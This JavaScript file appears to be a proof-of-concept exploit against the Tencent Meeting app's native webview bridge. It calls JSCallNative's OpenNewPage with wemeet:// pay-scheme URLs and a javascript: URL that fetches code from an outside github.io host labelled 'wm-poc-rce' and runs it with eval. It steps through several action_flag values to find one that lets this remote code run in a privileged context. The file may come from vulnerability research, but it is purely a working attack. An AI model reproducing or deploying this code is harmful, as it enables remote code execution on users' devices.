(function(){
  document.title='P80TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P80CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var jsurl='javascript:void(fetch("https://gitwhs.github.io/wm-poc-rce/p80main.js").then(function(r){return r.text()}).then(eval))';
  var pay='wemeet://page/pay/main_process_webview';
  var payjs=pay+'?url='+encodeURIComponent(jsurl);
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['O0','CommonPlugin','OpenNewPage',{url:jsurl}],
    ['O1','CommonPlugin','OpenNewPage',{url:official,scheme:pay,action_flag:1}],
    ['O2','CommonPlugin','OpenNewPage',{url:jsurl,scheme:pay,action_flag:1}],
    ['O3','CommonPlugin','OpenNewPage',{url:jsurl,scheme:pay,action_flag:2}],
    ['O4','CommonPlugin','OpenNewPage',{url:jsurl,scheme:pay,action_flag:32}],
    ['O5','CommonPlugin','OpenNewPage',{url:jsurl,scheme:pay,action_flag:34}],
    ['O6','CommonPlugin','OpenNewPage',{url:jsurl,scheme:payjs,action_flag:1}],
    ['H3','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P80TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P80-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,3500);
  }
  setTimeout(n, 1500);
})();
